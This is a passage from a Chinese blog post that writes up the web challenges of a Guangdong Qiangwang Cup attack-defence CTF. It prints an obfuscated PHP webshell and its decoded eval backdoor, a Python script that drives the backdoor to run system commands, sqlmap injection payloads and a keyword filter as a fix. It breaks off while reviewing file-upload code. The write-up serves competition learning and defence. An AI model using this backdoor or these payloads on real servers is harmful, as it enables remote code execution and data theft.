@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="kira">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="kira">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>广东强网杯AWD题目分析 · kir[A]&#39;s 小黑屋</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >kir[A]&#39;s 小黑屋</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">广东强网杯AWD题目分析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>kir[A]'s 小黑屋</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            广东强网杯AWD题目分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "awd">awd</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.2k</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>本文首发于 <a href="https://xz.aliyun.com/t/6416" target="_blank" rel="noopener">https://xz.aliyun.com/t/6416</a></p>
+<h1 id="广东强网杯AWD题目分析"><a href="#广东强网杯AWD题目分析" class="headerlink" title="广东强网杯AWD题目分析"></a>广东强网杯AWD题目分析</h1><p>上周末跟着大佬去广外打了一场线下赛，上午是应急响应，总体难度不大，大部分队伍都完成了10题，剩余一题逻辑卷损坏不会做。下午是AWD，由于主办方问题，导致了比赛延迟了1小时才进行，给了大量的时间进行题目分析，3个环境都在1小时内写好EXP。同时还有两个非预期的翻车事故，一是所有靶机的密码竟然都是一样，导致不少队伍给别人改了密码。二是使用操作系统竟然不是最新的内核版本，导致被人进行了提权。下面总结一下3个题目找到的漏洞，以及防御方法。</p>
+<h2 id="web1-php"><a href="#web1-php" class="headerlink" title="web1 php"></a>web1 php</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221348-86c238a2-ded5-1.png" alt="image.png"></p>
+<p>第一个web是一个php写的CMS</p>
+<h3 id="漏洞一-预置后门"><a href="#漏洞一-预置后门" class="headerlink" title="漏洞一 预置后门"></a>漏洞一 预置后门</h3><p>使用D盾可以扫到一个后门</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221421-9ae01688-ded5-1.png" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>后门不是简单的一句话木马，需要调试分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($I); <span class="comment">// %00lambda_1</span></span><br><span class="line">var_dump($q); <span class="comment">// $k="5ac91f7d";$kh="b9615a29bc1d";$kf="24d0b67c2c91";$p="9GmIEgwZ7HiEeclS";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1)&#123;@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>整理一下代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line">$p=<span class="string">"9GmIEgwZ7HiEeclS"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span>&#123;</span><br><span class="line">  $c=strlen($k);</span><br><span class="line">  $l=strlen($t);</span><br><span class="line">  $o=<span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">      $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@preg_match(<span class="string">"/$kh(.+)$kf/"</span>,@file_get_contents(<span class="string">"php://input"</span>),$m)==<span class="number">1</span>)&#123;</span><br><span class="line">  @ob_start();</span><br><span class="line">  @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode($m[<span class="number">1</span>]),$k)));</span><br><span class="line">  $o=@ob_get_contents();</span><br><span class="line">  @ob_end_clean();</span><br><span class="line">  $r=@base64_encode(@x(@gzcompress($o),$k));</span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"$p$kh$r$kf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>后门的流程如下：</p>
+<ol>
+<li>首先用正则匹配post的内容，前缀为<code>$kh</code>，后缀为<code>$kf</code></li>
+<li>匹配内容进行base64解码</li>
+<li>进行xor，key为<code>$k</code></li>
+<li>进行gzuncompress解压</li>
+<li>进入eval执行代码</li>
+<li>返回内容用相反的顺序进行加密</li>
+</ol>
+<p>根据后门的流程编写python脚本即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(t,k)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(t,k*(len(t)/len(k)+<span class="number">1</span>))])</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));</span></span><br><span class="line">cmd = <span class="string">'system("cat /flag");'</span></span><br><span class="line">cmd = zlib.compress(cmd)</span><br><span class="line">cmd = x(cmd,<span class="string">"5ac91f7d"</span>)</span><br><span class="line">cmd = base64.b64encode(cmd)</span><br><span class="line"></span><br><span class="line">rawBody = <span class="string">"b9615a29bc1d&#123;cmd&#125;24d0b67c2c91"</span>.format(cmd=cmd)</span><br><span class="line">response = session.post(<span class="string">"http://192.168.100.101:50003/123.php"</span>, data=rawBody)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Response body: %s"</span> % response.content)</span><br><span class="line">res = re.findall(<span class="string">r'b9615a29bc1d(.+)24d0b67c2c91'</span>,response.content)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r=@base64_encode(@x(@gzcompress($o),$k));</span></span><br><span class="line">res = base64.b64decode(res)</span><br><span class="line">res = x(res,<span class="string">"5ac91f7d"</span>)</span><br><span class="line">res = zlib.decompress(res)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221438-a49e3fc4-ded5-1.png" alt="image.png"></p>
+<h3 id="漏洞一修复"><a href="#漏洞一修复" class="headerlink" title="漏洞一修复"></a>漏洞一修复</h3><p>比起之前见过的一些简单粗暴的内置一句话木马，这个后门相对复杂，不至于一上来就被人打爆。防御方式不用多说，直接删掉这段代码即可。</p>
+<h3 id="漏洞二-数据库注入"><a href="#漏洞二-数据库注入" class="headerlink" title="漏洞二 数据库注入"></a>漏洞二 数据库注入</h3><p>打开源码，会发现大量的数据库查询语句，一般只有addslashes，无任何过滤，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=addslashes($_GET[<span class="string">'cid'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT * FROM content WHERE id='$id'"</span>;</span><br></pre></td></tr></table></figure>
+<p>直接使用sqlmap跑一下就跑出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Parameter: cid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: r=software&amp;cid=1 RLIKE (SELECT (CASE WHEN (6552=6552) THEN 1 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: r=software&amp;cid=1 AND EXTRACTVALUE(9269,CONCAT(0x5c,0x716b766271,(SELECT (ELT(9269=9269,1))),0x716a626b71))</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: r=software&amp;cid=1 AND SLEEP(5)</span><br></pre></td></tr></table></figure></p>
+<p>可以直接通过<code>load_file</code>来读取flag。</p>
+<h3 id="漏洞二修复"><a href="#漏洞二修复" class="headerlink" title="漏洞二修复"></a>漏洞二修复</h3><p>当时尝试把ctf用户降权，但是权限不够，那么只能从代码入手。可以在数据库查询之前，对输入参数进行过滤.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $filter = <span class="string">"/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|"</span> . urldecode(<span class="string">'%09'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">"%0a"</span>) . <span class="string">"|"</span> . urldecode(<span class="string">"%0b"</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%0c'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%0d'</span>) . <span class="string">"|"</span> . urldecode(<span class="string">'%a0'</span>) . <span class="string">"/i"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter, $str)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you can't input this illegal char!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞三-文件上传"><a href="#漏洞三-文件上传" class="headerlink" title="漏洞三 文件上传"></a>漏洞三 文件上传</h3><p>查看数据库，可以看到后台密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from manage;</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">| id | user  | name  | password                         | img                                   | mail        | qq       | date                |</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">|  1 | admin | admin | 5df3d06e515ef461ddc315aaf1ef9963 | ../upload/touxiang/61751569137471.php | me@baidu.so | 86226999 | 2019-09-22 08:18:14 |</span><br><span class="line">+----+-------+-------+----------------------------------+---------------------------------------+-------------+----------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221456-af5dc092-ded5-1.png" alt="image.png"></p>
+<p>登录后台可以进行头像上传</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190924221504-b476feae-ded5-1.png" alt="image.png"></p>
+<p>查看源码上传部分的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'images'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">$query = <span class="string">"SELECT * FROM imageset"</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$imageset = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../inc/up.class.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($HTTP_POST_FILES[<span class="string">'images'</span>][<span class="string">'tmp_name'</span>]))<span class="comment">//判断接收数据是否为空</span></span><br><span class="line">&#123;</span><br><span class="line">    $tmp = <span class="keyword">new</span> FileUpload_Single;</span><br><span class="line">    var_dump($tmp);</span><br><span class="line">    $upload=<span class="string">"../upload/touxiang"</span>;<span class="comment">//图片上传的目录，这里是当前目录下的upload目录，可自已修改</span></span><br><span class="line">    $tmp -&gt; accessPath =$upload;</span><br><span class="line">    <span class="keyword">if</span> ( $tmp -&gt; TODO() )</span><br><span class="line">    &#123;</span><br><span class="line">      $filename=$tmp -&gt; newFileName;<span class="comment">//生成的文件名</span></span><br><span class="line">      $filename=$upload.<span class="string">'/'</span>.$filename;</span><br><span class="line">      $imgsms=<span class="string">"及图片"</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>/inc/up.class.php</code>可能有过滤，查看一下代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUpload_Single</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//user define ------------------------------------- </span></span><br><span class="line"><span class="keyword">var</span> $accessPath ;</span><br><span class="line"><span class="keyword">var</span> $fileSize=<span class="number">4000</span>;</span><br><span class="line"><span 